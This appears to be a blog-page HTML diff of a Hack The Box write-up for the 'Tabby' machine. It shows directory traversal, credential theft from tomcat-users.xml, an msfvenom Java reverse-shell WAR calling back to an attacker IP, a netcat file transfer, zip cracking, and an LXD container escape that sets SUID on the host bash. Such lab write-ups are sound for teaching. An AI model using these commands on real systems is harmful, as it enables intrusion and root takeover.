@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Linux - Easy] - Tabby | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Linux - Easy] - Tabby" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2022/08/24/Tabby.html" />
+<meta property="og:url" content="http://localhost:4000/2022/08/24/Tabby.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-24T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Linux - Easy] - Tabby" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-24T00:00:00+02:00","datePublished":"2022-08-24T00:00:00+02:00","headline":"HTB Writeup [Linux - Easy] - Tabby","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/08/24/Tabby.html"},"url":"http://localhost:4000/2022/08/24/Tabby.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Linux - Easy] - Tabby</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-08-24T00:00:00+02:00" itemprop="datePublished">Aug 24, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Tabby/Tabby.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Tabby</strong> is a <strong>linux</strong> machine hosting both <strong>Apache web server</strong> and <strong>Tomcat</strong>.</li>
+  <li>The website on port 80 had a <strong>Directory Traversal vulnerability</strong> which enabled us to <strong>read a Tomcat configuration file</strong> which <strong>contained valid credentials.</strong></li>
+  <li><em>Using those,</em> we <strong>get a user with enough privileges to upload a WAR file containing a reverse shell</strong>. <em>And, with that</em>, we <strong>access the box</strong> as the <code class="language-plaintext highlighter-rouge">tomcat</code> user.</li>
+  <li>We find an <strong>encrypted backup archive in the webroot</strong>. We <strong>crack it</strong> with <code class="language-plaintext highlighter-rouge">john</code> to <strong>get a password.</strong></li>
+  <li>The password was <em>being reused</em> by another user on the box (<code class="language-plaintext highlighter-rouge">ash</code>). And, he happened to be <strong>a member of the <code class="language-plaintext highlighter-rouge">lxd</code> group.</strong></li>
+  <li>We <strong>escalate our privileges</strong> to <code class="language-plaintext highlighter-rouge">root</code> by <strong>creating a specially-configured container</strong>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Mega Hosting
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us areas to check: the <strong>website on port 80</strong> and the <strong>Tomcat instance on port 8080</strong></p>
+
+<h2 id="port-80">Port 80</h2>
+<p>The home page here was mostly <strong>static content</strong>.</p>
+
+<p><img src="/assets/Tabby/homepage-port-80.jpg" alt="" /></p>
+
+<p><em>except for</em> the <strong>link for the “News” page.</strong></p>
+
+<p>note: <em>on the link below</em>, notice <em>how the host name changed</em> to <strong>“megahosting.htb”</strong></p>
+
+<p><img src="/assets/Tabby/virtual-host-routing.jpg" alt="" /></p>
+
+<p>an entry in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> should take care of this <strong>Virtual Host Routing</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.194 megahosting.htb
+</code></pre></div></div>
+
+<p>we also notice that <code class="language-plaintext highlighter-rouge">news.php</code> handles <strong>a parameter</strong> called <code class="language-plaintext highlighter-rouge">file</code>. this looks like a <strong>file inclusion vulnerability.</strong></p>
+
+<p><img src="/assets/Tabby/lfi-spotted.jpg" alt="" /></p>
+
+<p>trying <code class="language-plaintext highlighter-rouge">/etc/passwd</code> in the parameter doesn’t work.</p>
+
+<p>but going <strong>4 directories back</strong> with <code class="language-plaintext highlighter-rouge">../../../../</code> gets us the <strong>confirmation</strong> we need.</p>
+
+<p><img src="/assets/Tabby/lfi-confirmed.jpg" alt="" /></p>
+
+<p><em>after a couple of tries to get the path right,</em> we are able to <strong>retrieve the source code</strong> of the <code class="language-plaintext highlighter-rouge">news.php</code> file:</p>
+
+<p><img src="/assets/Tabby/news-php-src-code.jpg" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">fopen</code> function here makes this a <strong>Directory/Path Traversal vulnerability</strong> and <strong>not a Local File Inclusion.</strong></p>
+
+<p>that’s because <code class="language-plaintext highlighter-rouge">fopen</code> just <strong>reads a file’s contents</strong>. it <strong>doesn’t evaluate PHP code</strong> like <code class="language-plaintext highlighter-rouge">include</code> or <code class="language-plaintext highlighter-rouge">require</code></p>
+
+<p><strong><em>Knowing this bit spares us the effort of trying to get code execution by including PHP.</em></strong></p>
+
+<h2 id="reading-sensitive-files">Reading Sensitive Files</h2>
+<p><em>As a quick check,</em> I try to read the <code class="language-plaintext highlighter-rouge">ash</code> user’s <strong>private SSH key</strong> (<code class="language-plaintext highlighter-rouge">/home/ash/.ssh/id_rsa</code>). But it’s <em>not that easy</em> :)</p>
+
+<p>I then think “maybe I should check out the tomcat to avoid any rabbit holes”. In case there’s something to be found there.</p>
+
+<p><img src="/assets/Tabby/tomcat-homepage.jpg" alt="" /></p>
+
+<p>We get some <strong>decent information</strong> from this page. the <strong>webroot</strong> and <strong>where Tomcat is installed.</strong></p>
+
+<p><em>But, when it comes to sensitive files,</em> there’s <strong>a very important one</strong> called <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code>. it’s in <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/</code> by default.</p>
+
+<p>We found it there and got <strong>creds for a user</strong> with <strong>very nice privileges</strong> :]</p>
+
+<p><img src="/assets/Tabby/reading-tomcat-users-xml.jpg" alt="" /></p>
+
+<h2 id="exploiting-our-tomcat-privileges-for-rce">Exploiting our Tomcat Privileges for RCE</h2>
+<p>The <code class="language-plaintext highlighter-rouge">manager-script</code> role has access to <strong>upload WAR files.</strong></p>
+
+<p>to abuse this, we will generate a <strong>WAR reverse shell</strong> with <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.3 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> revvy.war
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/creating-a-war-file.jpg" alt="" /></p>
+
+<p>then <strong>upload the WAR file</strong> using <code class="language-plaintext highlighter-rouge">curl</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> tomcat:<span class="s1">'$3cureP4s5w0rd123!'</span> <span class="nt">-T</span> revvy.war <span class="s2">"http://tabby:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
+</code></pre></div></div>
+
+<p>start up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on port 9000</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9000
+</code></pre></div></div>
+
+<p>and <code class="language-plaintext highlighter-rouge">curl</code> the endpoint to hit and trigger our reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://tabby:8080/shell
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/shell-as-tomcat.jpg" alt="" /></p>
+
+<p>we’re in as <code class="language-plaintext highlighter-rouge">tomcat</code> :)</p>
+
+<h2 id="pivoting-with-password-reuse">Pivoting with Password Reuse</h2>
+
+<p><em>Right after improving our shell,</em> we start with <strong>checking the files</strong> in <code class="language-plaintext highlighter-rouge">/var/www/html</code></p>
+
+<p>there was a folder called <code class="language-plaintext highlighter-rouge">files</code>. It contained a <strong>password-protected zip archive</strong> that was <strong>owned by</strong> the <code class="language-plaintext highlighter-rouge">ash</code> user.</p>
+
+<p><img src="/assets/Tabby/finding-ashes-zip-file.jpg" alt="" /></p>
+
+<p>we <strong>transfer it over</strong> to our kali using <code class="language-plaintext highlighter-rouge">netcat</code> so we can <strong>crack</strong> it</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># on tabby</span>
+nc <span class="nt">-lvnp</span> 5000 &lt; 16162020_backup.zip
+<span class="c"># on our kali</span>
+nc tabby 5000 <span class="o">&gt;</span> ash_backup.zip
+</code></pre></div></div>
+
+<p><em>and, to verify that the file wasn’t corrupted in-transit,</em> we do a quick <strong>integrity check</strong> using <code class="language-plaintext highlighter-rouge">md5sum</code>.</p>
+
+<p><img src="/assets/Tabby/transferring-zip-file.jpg" alt="" /></p>
+
+<p>we use <code class="language-plaintext highlighter-rouge">zip2john</code> to <strong>get a hash</strong> for <code class="language-plaintext highlighter-rouge">john</code> to crack.</p>
+
+<p><img src="/assets/Tabby/zip-password.jpg" alt="" /></p>
+
+<p>it successfully cracked. but we <em>didn’t find anything important</em> within the archive itself.</p>
+
+<p><img src="/assets/Tabby/zip-files.jpg" alt="" /></p>
+
+<p>the files were practically <strong><em>the same as the original ones.</em></strong></p>
+
+<p><em>But, since we now had a password,</em> we tried it against <code class="language-plaintext highlighter-rouge">ash</code> and <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p>didn’t work with <code class="language-plaintext highlighter-rouge">root</code>, but <strong>did</strong> with <code class="language-plaintext highlighter-rouge">ash</code> :)</p>
+
+<p><img src="/assets/Tabby/logged-in-as-ash.jpg" alt="" /></p>
+
+<h2 id="lxd-privilege-escalation">LXD Privilege Escalation</h2>
+<p><em>As you may have noticed from the previous image,</em> <code class="language-plaintext highlighter-rouge">ash</code> is part of the <code class="language-plaintext highlighter-rouge">lxd</code> group</p>
+
+<p><img src="/assets/Tabby/lxd-group-membership.jpg" alt="" /></p>
+
+<p>this is <em>almost exactly the same situation</em> as in the <a href="https://omnisl4sh.github.io/2022/08/17/Brainfuck.html#lxd-privilege-escalation">Brainfuck Privesc</a>.</p>
+
+<p>one <em>minor difference</em> is that <strong>we have to initialize the LX daemon</strong> with <code class="language-plaintext highlighter-rouge">lxd init</code> before importing the image.</p>
+
+<p>note: also make sure to add <code class="language-plaintext highlighter-rouge">/snap/bin</code> to the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable as <em>it’s not there by default.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/snap/bin/
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/lxd-init.jpg" alt="" /></p>
+
+<p><em>for a bit of automation,</em> we’re going to throw the commands into a <strong>bash script</strong>. here are the contents:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+lxc image import alpine-small-image.tar.gz <span class="nt">--alias</span> myimage
+lxc image list
+lxc init myimage mycontainer <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
+</span>lxc config device add mycontainer mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
+</span>lxc start mycontainer
+lxc <span class="nb">exec </span>mycontainer /bin/sh
+</code></pre></div></div>
+
+<p><em>after getting the container root shell,</em> we add an <strong>SUID bit</strong> to the host’s <strong>bash shell</strong> so we can run it as <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +s /mnt/root/bin/bash
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/lxc-root-bash-script.jpg" alt="" /></p>
+
+<h2 id="cleaning-up">Cleaning Up</h2>
+
+<p><em>To clear away remnants,</em> we have to <strong>stop the container</strong>, <strong>delete it</strong> along with <strong>the image we imported.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc stop mycontainer
+lxc delete mycontainer
+lxc image delete myimage
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/lxc-cleanup.jpg" alt="" /></p>
+
+  </div><a class="u-url" href="/2022/08/24/Tabby.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
